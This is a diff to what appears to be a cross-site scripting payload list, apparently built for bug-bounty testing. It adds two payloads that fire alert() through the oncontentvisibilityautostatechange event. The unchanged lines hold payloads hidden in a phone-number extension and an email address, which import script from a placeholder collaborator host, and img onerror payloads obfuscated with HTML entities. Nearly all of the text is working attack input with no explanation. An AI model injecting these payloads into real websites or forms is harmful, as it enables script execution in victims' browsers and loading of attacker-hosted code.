@@ -1,5 +1,7 @@
 013371337;ext=<img/src/onerror=import('//COLLABORATOR-HERE/')>
 "><img/src/onerror=import('//COLLABORATOR-HERE/')>"@wearehackerone.com
+<input type="hidden" oncontentvisibilityautostatechange="alert(/ChromeCanary/)" style="content-visibility:auto">
+<p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
 <img src=data: onerror="&dscy;=alert;&dscy;('&#38;dscy;')">
 <img src=data: onerror="&pfr;=alert;&pfr;('&#38;pfr;')">
 <img src=data: onerror="&ycirc;=alert;&ycirc;('&#38;ycirc;')">
